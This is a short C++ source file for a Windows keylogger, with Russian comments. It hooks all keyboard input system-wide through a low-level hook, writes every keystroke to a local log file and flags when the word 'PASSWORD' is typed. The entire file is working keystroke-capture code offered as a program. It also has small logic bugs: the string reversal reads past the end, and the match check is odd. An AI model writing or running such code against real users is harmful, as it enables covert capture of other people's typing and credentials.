// KeyLogger.cpp: определяет точку входа для консольного приложения.
//

#include "stdafx.h"
#include "iostream"
#include <list>      
#include <Windows.h>
#include <iterator>  
#include <string>

#include <fstream>
#pragma comment (lib, "user32.lib")

using namespace std;

list <char> letters;

HHOOK hHook{ NULL };
string typedText = "";
string word = "PASSWORD";




string insertFirst(string letters, char letter) {
	string tempString;
	if (letters.length() > word.length() - 1)
		tempString = letter + letters.substr(0, word.length() - 1);
	else
		tempString = letter + letters;
	return tempString;
}

string reverseString(string s) {
	string tempString;
	for (int i = s.length(); i >= 0; i--) {
		tempString += s[i];
	}
	return tempString;
}


LRESULT CALLBACK MyLowLevelKeyboardProc(const int nCode, const WPARAM wParam, const LPARAM lParam) {
	switch (wParam) {
	case WM_KEYDOWN:
		
		DWORD vk = ((LPKBDLLHOOKSTRUCT)lParam)->vkCode;
		std::cout << "   Key hited. Key = " << (char)vk << "   Kode: " << vk << std::endl;

		typedText = insertFirst(typedText, (char)vk);
		ofstream fapp("keyLog.log", ios::app); 
		fapp << "Key hited. Key = : " << (char)vk << "\n";  
		
	 
		string reversedTypedText = reverseString(typedText);
		 
		if (reversedTypedText.find(word) == 1) {
			cout << "entered password\n";
			fapp << "entered password\n";
		}

		cout << typedText;
		


		fapp.close(); // закрываем файл

	}
	return CallNextHookEx(hHook, nCode, wParam, lParam);
} 



int main(int argc, char* argv[])
{
	hHook = SetWindowsHookEx(WH_KEYBOARD_LL, MyLowLevelKeyboardProc, NULL, 0);
	if (NULL == hHook) {
		std::cout << "Keyboard hook failed!" << std::endl;
	}


	while (GetMessage(NULL, NULL, 0, 0));
	return 0;
}

